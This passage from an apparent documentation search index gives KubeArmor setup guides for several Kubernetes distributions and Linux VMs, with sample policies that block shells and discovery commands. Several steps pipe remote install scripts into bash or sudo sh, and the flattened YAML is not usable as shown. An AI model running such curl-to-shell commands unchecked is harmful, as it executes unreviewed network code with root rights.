policy:</p> <pre><code>kubectl apply -f kubearmor_policies_default_wordpress-mysql_wordpress_divgfyof.yaml\n</code></pre> <p></p> <p>To uninstall all the services Installed:</p> <pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash\n</code></pre> <pre><code>kubectl delete -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml\n</code></pre>"},{"location":"open-source/kubearmor/eks/","title":"EKS Ubuntu Server 20.04","text":""},{"location":"open-source/kubearmor/eks/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on EKS Ubuntu Server 20.04 by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/kubearmor/eks/#step-1-create-a-eks-cluster","title":"Step 1: Create a EKS Cluster","text":"<p>Install EKS CTL, AWS CLI, Helm tools</p> <pre><code>cat eks-config.yaml </code></pre> <pre><code>apiVersion: eksctl.io/v1alpha5\nkind: ClusterConfig\nmetadata:\nname: eks-ubuntu-cluster\nregion: us-east-2\nnodeGroups:\n- name: ng-1\ninstanceType: c5a.xlarge\namiFamily: \"Ubuntu2004\"\ndesiredCapacity: 1\nvolumeSize: 80\nssh:\nallow: true\npreBootstrapCommands:\n- \"sudo apt install linux-headers-$(uname -r)\"\n</code></pre> <p>Official Link: Sample eks-config.yaml</p> <p>Note:</p> <p>EKS suported image types:  </p> <ul> <li> <p>Amazon Linux 2</p> </li> <li> <p>Ubuntu 20.04 </p> </li> <li> <p>Ubuntu 18.04</p> </li> <li> <p>Bottlerocket</p> </li> <li> <p>Windows Server 2019 Core Container </p> </li> <li> <p>Windows Server 2019 Full Container </p> </li> <li> <p>Windows Server 2004 Core Container</p> </li> <li> <p>Windows Server 20H2 Core Container</p> </li> </ul> <pre><code>eksctl create cluster -f eks-config.yaml\n</code></pre> <p></p> <pre><code>aws eks --region us-east-2 update-kubeconfig --name eks-ubuntu-cluster\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/eks/#step-2-karmor-install","title":"Step 2: Karmor Install","text":"<p>Install Karmor CLI:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <pre><code>karmor version\n</code></pre> <pre><code>karmor install  </code></pre> <p></p> <p>Karmor Verify:</p> <pre><code>kubectl get pods -n kube-system | grep kubearmor\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/eks/#step-3-kubearmor-policy","title":"Step 3: Kubearmor Policy","text":"<p>1. Create a nginx deployment</p> <pre><code>kubectl create deployment nginx --image nginx\n</code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Explore the policy</p> <pre><code>cat nginx-kubearmor-policy.yaml </code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy\n# namespace: accuknox-agents # Change your namespace\nspec:\ntags: [\"MITRE\", \"T1082\"]\nmessage: \"System owner discovery command is blocked\"\nselector:\nmatchLabels:\napp: nginx # use your own label here\nprocess:\nseverity: 3\nmatchPaths:\n- path: /usr/bin/who\n- path: /usr/bin/w\n- path: /usr/bin/id\n- path: /usr/bin/whoami\naction: Block\n</code></pre> <p></p> <p>3. Apply the policy</p> <p><pre><code>kubectl apply -f nginx-kubearmor-policy.yaml  </code></pre> </p> <p>Note: Policy will work based on matched lables.  Ex: (app: nginx)</p> <p>4. Policy violation</p> <pre><code>kubectl exec -it nginx-766b69bd4b-8jttd -- bash  </code></pre> <p></p> <p>5. Kubearmor SVC port forward to Monitor the logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <p>6. Verifying policy Violation logs</p> <pre><code>karmor log\n</code></pre> <p></p> <p></p>"},{"location":"open-source/kubearmor/k3s/","title":"K3's Cluster","text":""},{"location":"open-source/kubearmor/k3s/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on K3's by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/kubearmor/k3s/#step-1-install-k3s-on-linux","title":"Step 1: Install K3's on Linux","text":"<pre><code>curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC='--flannel-backend=none --disable traefik' sh -s - --write-kubeconfig-mode 644\n</code></pre> <pre><code>export KUBECONFIG=/etc/rancher/k3s/k3s.yaml\n</code></pre> <pre><code>cp /etc/rancher/k3s/k3s.yaml ~/.kube/config\n</code></pre> <pre><code>systemctl status k3s\n</code></pre> <pre><code>which kubectl ; kubectl get nodes\n</code></pre>"},{"location":"open-source/kubearmor/k3s/#step-2-install-karmor","title":"Step 2: Install Karmor","text":"<pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <pre><code>karmor install\n</code></pre> <p>Karmor verify</p> <pre><code>kubectl get pods -n kube-system | grep kubearmor\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/k3s/#step-3-kubearmor-policy-audit","title":"Step 3: Kubearmor Policy - Audit","text":"<p>3.1 Create a nginx deployment</p> <pre><code>kubectl create deployment nginx --image nginx\n</code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/k3s/#1-process-level","title":"1. Process Level","text":"<pre><code>vim nginx-kubearmor-ppolicy-a.yaml </code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy-pa\n# namespace: k3-test # Change your namespace\nspec:\nselector:\nmatchLabels:\napp: nginx # use your own label here\nprocess:\nseverity: 3\nmatchPaths:\n- path: /usr/bin/touch\n- path: /bin/rm\n- path: /bin/chmod\n- path: /usr/sbin/nginx\naction: Audit\n</code></pre> <p>Apply the policy</p> <pre><code>kubectl apply -f nginx-kubearmor-ppolicy-a.yaml  </code></pre> <pre><code>kubectl get ksp\n</code></pre> <p></p> <p>Note: Policy will work based on matched labels Ex: (app: nginx)</p> <p>Violating the Policy</p> <pre><code>kubectl exec -it nginx-8f458dc5b-shshr -- bash\n</code></pre> <p></p> <p>Policy violation logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <pre><code>karmor log\n</code></pre> <p></p> <p></p> <p></p>"},{"location":"open-source/kubearmor/k3s/#2-file-level","title":"2. File Level","text":"<pre><code>vim nginx-kubearmor-fpolicy-a.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy-fa\n# namespace: k3-test # Change your namespace\nspec:\nselector:\nmatchLabels:\napp: nginx # use your own label here\nfile:\nseverity: 3\nmatchPaths:\n- path: /etc/fstab\naction: Audit\n</code></pre> <p>Apply the policy</p> <pre><code>kubectl apply -f nginx-kubearmor-fpolicy-a.yaml </code></pre> <pre><code>kubectl get ksp\n</code></pre> <p></p> <p>Note: Policy will work based on matched labels Ex: (app: nginx)</p> <p>Violating the Policy</p> <pre><code>kubectl exec -it nginx-8f458dc5b-shshr -- bash\n</code></pre> <p></p> <p>Policy violation logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/k3s/#3-directory-level","title":"3. Directory Level","text":"<pre><code>vim nginx-kubearmor-dpolicy-a.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy-da\n# namespace: k3-test # Change your namespace\nspec:\nselector:\nmatchLabels:\napp: nginx # use your own label here\nfile:\nseverity: 3\nmatchDirectories:\n- dir: /boot/\nrecursive: true\naction: Audit\n</code></pre> <p>Apply the policy</p> <pre><code>kubectl apply -f nginx-kubearmor-dpolicy-a.yaml\n</code></pre> <pre><code>kubectl get ksp\n</code></pre> <p></p> <p>Note: Policy will work based on matched labels Ex: (app: nginx)</p> <p>Violating the Policy</p> <pre><code>kubectl exec -it nginx-8f458dc5b-shshr -- bash\n</code></pre> <p></p> <p>Policy violation logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/k3s/#step-4-kubearmor-policy-block","title":"Step 4: Kubearmor Policy - Block","text":""},{"location":"open-source/kubearmor/k3s/#1-process-level_1","title":"1. Process Level","text":"<pre><code>vim nginx-kubearmor-ppolicy-b.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy-pb\n# namespace: k3-test # Change your namespace\nspec:\nselector:\nmatchLabels:\napp: nginx # use your own label here\nprocess:\nseverity: 3\nmatchPaths:\n- path: /usr/bin/touch\n- path: /bin/rm\n- path: /bin/chmod\n- path: /usr/sbin/nginx\naction: Block\n</code></pre> <p>Apply the policy</p> <pre><code>kubectl apply -f nginx-kubearmor-ppolicy-b.yaml  </code></pre> <pre><code>kubectl get ksp\n</code></pre> <p></p> <p>Note: Policy will work based on matched labels Ex: (app: nginx)</p> <p>Violating the Policy</p> <pre><code>kubectl exec -it nginx-8f458dc5b-shshr -- bash\n</code></pre> <p></p> <p>Policy violation logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <pre><code>karmor log\n</code></pre> <p></p> <p></p>"},{"location":"open-source/kubearmor/k3s/#2-file-level_1","title":"2. File Level","text":"<pre><code>vim nginx-kubearmor-fpolicy-b.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy-fb\n# namespace: k3-test # Change your namespace\nspec:\nselector:\nmatchLabels:\napp: nginx # use your own label here\nfile:\nseverity: 3\nmatchPaths:\n- path: /etc/fstab\naction: Block\n</code></pre> <p>Apply the policy</p> <pre><code>kubectl apply -f nginx-kubearmor-fpolicy-b.yaml </code></pre> <pre><code>kubectl get ksp\n</code></pre> <p></p> <p>Note: Policy will work based on matched labels Ex: (app: nginx)</p> <p>Violating the Policy</p> <pre><code>kubectl exec -it nginx-8f458dc5b-shshr -- bash\n</code></pre> <p></p> <p>Policy violation logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/k3s/#3-directory-level_1","title":"3. Directory Level","text":"<pre><code>vim nginx-kubearmor-dpolicy-b.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy-db\n# namespace: k3-test # Change your namespace\nspec:\nselector:\nmatchLabels:\napp: nginx # use your own label here\nfile:\nseverity: 3\nmatchDirectories:\n- dir: /boot/\nrecursive: true\naction: Block\n</code></pre> <p>Apply the policy</p> <pre><code>kubectl apply -f nginx-kubearmor-dpolicy-b.yaml\n</code></pre> <pre><code>kubectl get ksp\n</code></pre> <p></p> <p>Note: Policy will work based on matched labels Ex: (app: nginx)</p> <p>Violating the Policy</p> <pre><code>kubectl exec -it nginx-8f458dc5b-shshr -- bash\n</code></pre> <p></p> <p>Policy violation logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/microk8s/","title":"MicroK8's Cluster","text":""},{"location":"open-source/kubearmor/microk8s/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on MicroK8's by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/kubearmor/microk8s/#step-1-setup-microk8s","title":"Step 1: Setup MicroK8's","text":"<p>Clone the Repository:</p> <pre><code>git clone https://github.com/kubearmor/KubeArmor.git\n</code></pre> <p></p> <pre><code>cd KubeArmor/contribution/microk8s\n</code></pre> <p>Run the script to set up MicroK8's Kubernetes:</p> <pre><code>./install_microk8s.sh\n</code></pre> <pre><code>kubectl get all -A\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/microk8s/#step-2-setup-kubearmor","title":"Step 2: Setup KubeArmor","text":"<p>Install Karmor CLI:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <pre><code>karmor install\n</code></pre> <p></p> <p>Karmor Verify: </p> <pre><code>kubectl get pods -n kube-system | grep kubearmor\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/microk8s/#step-3-create-kubearmor-policy","title":"Step 3: Create KubeArmor policy","text":"<p>1. Create nginx deployment</p> <pre><code>kubectl create deployment nginx --image nginx\n</code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Apply the following policy </p> <ul> <li> <p>KubeArmor is an open source software that enables you to protect your cloud workload at run-time.</p> </li> <li> <p>To learn more about KubeArmor</p> </li> </ul> <pre><code>vi ksp-block-untrusted-shell-execution.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: ksp-block-untrusted-shell-execution\nnamespace: default # Change your namespace\nspec:\ntags : [\"MITRE\",\"D3fend\",\"Execution\",\"Unix Shell\"] message: \"Bash shells have been accessed\"\nselector:\nmatchLabels:\napp: nginx\nprocess:\nseverity: 2 # Higher severity for processes \nmatchPaths:\n- path: /bin/bash\n- path: /bin/sh\n- path: /usr/bin/bash\n- path: /usr/bin/env\n- path: /usr/bin/shell\n- path: /bin/ksh\n- path: /etc/init.d      - path: /dev/tty - path: /bin/zsh\n- path: /bin/tcsh\n- path: /bin/csh\naction: Block   file:\nseverity: 10  # lowest severity for processes invoked as child process of bash\nmatchPaths:\n- path: /bin/bash\n- path: /bin/sh\n- path: /usr/bin/bash\n- path: /usr/bin/env\n- path: /usr/bin/shell\n- path: /bin/ksh\n- path: /etc/init.d      - path: /dev/tty - path: /bin/zsh\n- path: /bin/tcsh\n- path: /bin/csh\nfromSource:\n- path: /bin/bash\naction: Audit\n</code></pre> <p>3. Apply the policy</p> <pre><code>kubectl apply -f ksp-block-untrusted-shell-execution.yaml  </code></pre> <p>Note: Policy will work based on  matched labels  Ex:(app: nginx)</p> <pre><code>kubectl get pods\n</code></pre> <p></p> <p>4. Violating the policy</p> <pre><code>kubectl exec -it &lt;Pod Name&gt; -- bash </code></pre> <p>5. run sh, env commands for policy violation</p> <p></p> <p>Note: Kubearmor is working, we can't run the commands, which we have blocked in the policy..</p>"},{"location":"open-source/kubearmor/microk8s/#step-4-getting-alertstelemetry-from-kubearmor","title":"Step 4:  Getting Alerts/Telemetry from KubeArmor","text":"<p>1. Kubearmor SVC port forward to Monitor the logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <p>2. Verifying policy Violation logs</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/minikube/","title":"Minikube Cluster","text":""},{"location":"open-source/kubearmor/minikube/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on Minikube by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/kubearmor/minikube/#step-1-clone-the-repository","title":"Step 1: Clone the Repository","text":"<pre><code>git clone https://github.com/kubearmor/KubeArmor.git\n</code></pre>"},{"location":"open-source/kubearmor/minikube/#step-2-install-virtualbox","title":"Step 2: Install VirtualBox","text":"<pre><code>cd KubeArmor/contribution/minikube\n</code></pre> <pre><code>./install_virtualbox.sh\n</code></pre> <p>Note: Once VirtualBox installed, reboot the system.</p> <pre><code>sudo reboot\n</code></pre>"},{"location":"open-source/kubearmor/minikube/#step-3-install-minikube","title":"Step 3: Install Minikube","text":"<pre><code>cd KubeArmor/contribution/minikube\n</code></pre> <pre><code>./install_minikube.sh\n</code></pre> <pre><code>./start_minikube.sh\n</code></pre>"},{"location":"open-source/kubearmor/minikube/#step-4-karmor-install","title":"Step 4: Karmor Install","text":"<p>Install Karmor CLI:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <p></p> <pre><code>karmor install\n</code></pre> <p></p> <p>Karmor Verify:</p> <pre><code>karmor version\n</code></pre> <p></p> <pre><code>kubectl get pods -n kube-system | grep kubearmor\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/minikube/#step-5-kubearmor-policy","title":"Step 5: KubeArmor Policy","text":"<p>1. Creating sample ubuntu deployment </p> <pre><code>kubectl apply -f ubuntu.yaml\n</code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Apply the following policy </p> <p>*use label of the deployment </p> <pre><code>cat ksp-block-sting-rhel-v-230335.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: ksp-block-stig-rhel-v-230335\nnamespace: default # Change your namespace\nspec:\ntags: [\"STIG\",\"RHEL\"]\nmessage: \"Alert! /home/test.txt access will be Audit\"\nselector:\nmatchLabels:\napp: ubuntu # Change your matchLabels\nfile:\nseverity: 5\nmatchPaths:\n- path: /home/test.txt\naction: Block\n</code></pre> <p>3. Apply the policy</p> <pre><code>kubectl apply -f ksp-block-sting-rhel-v-230335.yaml\n</code></pre> <p></p> <p>4. Violating the policy</p> <pre><code>kubectl exec -it ubuntu-deployment-746964c6c6-j67jv bash\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/minikube/#step-6-getting-alertstelemetry-from-kubearmor","title":"Step 6: Getting Alerts/Telemetry from KubeArmor","text":"<p>1. KubeArmor SVC port forward to Monitor the logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor 32767:32767\n</code></pre> <p></p> <p>2. Verifying policy Violation logs</p> <pre><code>Karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/suse_les_15/","title":"SUSE Linux Enterprise Server 15","text":""},{"location":"open-source/kubearmor/suse_les_15/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on SUSE Linux Enterprise Server 15 with 5.3 Kernel Version by applying policies on VM workloads.</p>"},{"location":"open-source/kubearmor/suse_les_15/#step-1-install-kubearmor-on-vm","title":"Step 1: Install Kubearmor on VM","text":"<p>Install pre-requisites:</p> <pre><code>sudo zypper ref\nsudo zypper in bcc-tools bcc-examples\n</code></pre> <p></p> <pre><code>fullkver=$(zypper se -s kernel-default-devel | awk '{split($0,a,\"|\"); print a[4]}' | grep $(uname -r | awk '{gsub(\"-default\", \"\");print}') | sed -e 's/^[ \\t]*//' | tail -n 1)\n</code></pre> <p></p> <pre><code>zypper -n --config /var/opt/carbonblack/response/zypp.conf install -f -y kernel-default-devel=\"$fullkver\"\n</code></pre> <p></p> <pre><code>zypper in apparmor-utils\n</code></pre> <p></p> <pre><code>zypper in apparmor-profiles\n</code></pre> <p></p> <pre><code>systemctl restart apparmor.service\n</code></pre> <p>Download the Latest release of KubeArmor</p> <pre><code>wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.rpm\n</code></pre> <p></p> <pre><code>zypper install kubearmor_0.3.1_linux-amd64.rpm\n</code></pre> <p></p> <p>Start &amp; Check the status of Kubearmor:</p> <pre><code>sudo systemctl start kubearmor\n</code></pre> <pre><code>sudo systemctl enable kubearmor\n</code></pre> <pre><code>sudo systemctl status kubearmor\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/suse_les_15/#step-2-apply-and-verify-kubearmor-system-policy","title":"Step 2: Apply and Verify Kubearmor system policy","text":"<pre><code>cat khp-example-vmname.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: khp-02\nspec:\nseverity: 5\nfile:\nmatchPaths:\n- path: /proc/cpuinfo\naction:\nBlock\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm  policy add khp-example-vmname.yaml\n</code></pre>"},{"location":"open-source/kubearmor/suse_les_15/#step-3-policy-violation","title":"Step 3: Policy Violation","text":"<p>With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below.</p> <pre><code>cat /proc/cpuinfo\n</code></pre> <p></p> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/ubuntu18.04/","title":"Ubuntu 18.04","text":""},{"location":"open-source/kubearmor/ubuntu18.04/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on Ubuntu 18.04 with 5.4 Kernel Version by applying policies on VM workloads.</p>"},{"location":"open-source/kubearmor/ubuntu18.04/#step-1-install-kubearmor-on-vm","title":"Step 1: Install Kubearmor on VM","text":"<p>Install pre-requisites:</p> <pre><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 4052245BD4284CDD\n</code></pre> <pre><code>echo \"deb https://repo.iovisor.org/apt/$(lsb_release -cs) $(lsb_release -cs) main\" | sudo tee /etc/apt/sources.list.d/iovisor.list\n</code></pre> <pre><code>sudo apt-get update\n</code></pre> <pre><code>sudo apt-get install bcc-tools libbcc-examples linux-headers-$(uname -r)\n</code></pre> <pre><code>sudo apt install bpfcc-tools linux-headers-$(uname -r)\n</code></pre> <pre><code>sudo apt-get install linux-headers-generic\n</code></pre> <pre><code>sudo apt --fix-broken install\n</code></pre> <pre><code>sudo apt-get update\n</code></pre> <p>Download &amp; Install the Latest release of KubeArmor</p> <pre><code>wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb &amp;&amp; sudo dpkg -i kubearmor_0.3.1_linux-amd64.deb\n</code></pre> <p>Start and Check the status of Kubearmor:</p> <pre><code>sudo systemctl start kubearmor\n</code></pre> <pre><code>sudo systemctl enable kubearmor\n</code></pre> <pre><code>sudo systemctl status kubearmor\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/ubuntu18.04/#step-2-apply-and-verify-kubearmor-system-policy","title":"Step 2: Apply and Verify KubeArmor system policy","text":"<pre><code>vim sleepdenypolicy.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: hsp-kubearmor-dev-proc-path-block\nspec:\nprocess:\nmatchPaths:\n- path: bin/sleep # try sleep 1\naction:\nBlock\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add sleepdenypolicy.yaml\n</code></pre> <p></p> <p>Note: With the above mentioned policy enforced in master VM, if a user tries to access sleep command, user will see permission denied error and karmor log will show the alert log for blocking the file access.</p>"},{"location":"open-source/kubearmor/ubuntu18.04/#step-3-policy-violation","title":"Step 3: Policy Violation","text":"<pre><code>sleep 2\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p> <p>Deleting the applied policy: </p> <pre><code>karmor vm --kvms policy delete sleepdenypolicy.yaml\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/ubuntu20.04/","title":"Ubuntu 20.04","text":""},{"location":"open-source/kubearmor/ubuntu20.04/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on Ubuntu 20.04 with 5.13 Kernel Version by applying policies on VM workloads.</p>"},{"location":"open-source/kubearmor/ubuntu20.04/#step-1-install-kubearmor-on-vm","title":"Step 1: Install Kubearmor on VM","text":""},{"location":"open-source/kubearmor/ubuntu20.04/#install-pre-requisites","title":"Install pre-requisites:","text":"<pre><code>sudo apt update &amp;&amp; sudo apt upgrade\nsudo apt install make llvm clang libelf-dev linux-headers-generic\nsudo apt install bpfcc-tools linux-headers-$(uname -r)\n</code></pre>"},{"location":"open-source/kubearmor/ubuntu20.04/#for-bpftool-install-any-of-the-packages-for-system-environment","title":"For bpftool install any of the packages for system environment:","text":"<pre><code> sudo apt install linux-intel-iotg-5.15-tools-common\n sudo apt install linux-oem-5.6-tools-common\n sudo apt install linux-tools-common\n sudo apt install linux-iot-tools-common\n sudo apt install linux-tools-gcp\n sudo apt install linux-cloud-tools-gcp\n</code></pre>"},{"location":"open-source/kubearmor/ubuntu20.04/#to-install-kubearmor","title":"To install KubeArmor:","text":"<p>Note: Copy this whole below command and run it in your terminal. <pre><code>curl -s https://api.github.com/repos/kubearmor/KubeArmor/releases/latest \\\n| grep \"browser_download_url.*deb\" \\\n| cut -d : -f 2,3 \\\n| tr -d \\\" \\\n| wget -qi -\nsudo dpkg -i kubearmor_*_linux-amd64.deb\n</code></pre></p> <p></p>"},{"location":"open-source/kubearmor/ubuntu20.04/#if-above-error-occurs-run","title":"If above error occurs, Run:","text":"<pre><code>sudo apt --fix-broken install\n</code></pre>"},{"location":"open-source/kubearmor/ubuntu20.04/#start-and-check-the-status-of-kubearmor","title":"Start and Check the status of Kubearmor:","text":"<pre><code>sudo systemctl start kubearmor\n</code></pre> <pre><code>sudo systemctl enable kubearmor\n</code></pre> <pre><code>sudo systemctl status kubearmor\n</code></pre>"},{"location":"open-source/kubearmor/ubuntu20.04/#step-2-apply-and-verify-kubearmor-system-policy","title":"Step 2: Apply and Verify Kubearmor system policy","text":"<pre><code>cat khp-example-vmname.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: khp-02\nspec:\nseverity: 5\nfile:\nmatchPaths:\n- path: /proc/cpuinfo\naction:\nBlock\n</code></pre> <p><pre><code>karmor vm --kvms policy add khp-example-vmname.yaml\n</code></pre> Output:</p> <p><code>success</code></p> <p>Note: With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access.</p>"},{"location":"open-source/kubearmor/ubuntu20.04/#step-3-violating-the-policy","title":"Step 3: Violating the policy","text":"<pre><code>cat /proc/cpuinfo\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/al2/al2/","title":"Amazon Linux 2","text":""},{"location":"open-source/kubearmor/al2/al2/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor on Amazon Linux 2 Os with 5.10 Kernel Version by applying policies on VM workloads.</p> <p>Note: As of now KubeArmor for Amazon Linux 2 will only Support for Audit mode. In the upcoming updates it will also support Enforcements, such as Allow and Block.</p>"},{"location":"open-source/kubearmor/al2/al2/#step-1-install-kubearmor-and-karmor-cli-on-vm","title":"Step 1: Install KubeArmor and Karmor CLI on VM","text":"<p>Download the Latest release of KubeArmor</p> <pre><code>wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.rpm\n</code></pre> <pre><code>yum install kubearmor_0.3.1_linux-amd64.rpm\n</code></pre> <p>Start and Check the status of KubeArmor:</p> <pre><code>systemctl start kubearmor\n</code></pre> <pre><code>systemctl enable kubearmor\n</code></pre> <pre><code>systemctl status kubearmor\n</code></pre> <p></p> <p>Install Karmor CLI:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/bin\n</code></pre> <pre><code>karmor version\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/al2/al2/#step-2-apply-and-violating-kubearmor-system-policy","title":"Step 2: Apply and Violating KubeArmor System Policy","text":""},{"location":"open-source/kubearmor/al2/al2/#1-process-level","title":"1. Process Level","text":"<pre><code>cat propolicy.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: kubearmor-pro-policy\nspec:\nprocess:\nmatchPaths:\n- path: /usr/bin/whoami\n- path: /usr/bin/id\n- path: /usr/bin/cp\n- path: /usr/bin/rm\naction: Audit\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm policy add propolicy.yaml\n</code></pre> <p></p> <p>Violating the policy:</p> <pre><code>cp test1.txt  test2.txt\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/al2/al2/#2-file-level","title":"2. File Level","text":"<pre><code>cat filepolicy.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: kubearmor-file-policy\nspec:\nfile:\nmatchPaths:\n- path: /etc/fstab  action: Audit\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm policy add filepolicy.yaml\n</code></pre> <p></p> <p>Violating the policy:</p> <pre><code>cat /etc/fstab\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>karmor log\n</code></pre> <p></p>"},{"location":"open-source/kubearmor/al2/al2/#3-directory-level","title":"3. Directory Level","text":"<pre><code>cat dirpolicy.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: kubearmor-dir-policy\nspec:\nfile:\nmatchDirectories:\n- dir: /var/log/tomcat\nrecursive: true\naction: Audit\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm policy add dirpolicy.yaml\n</code></pre> 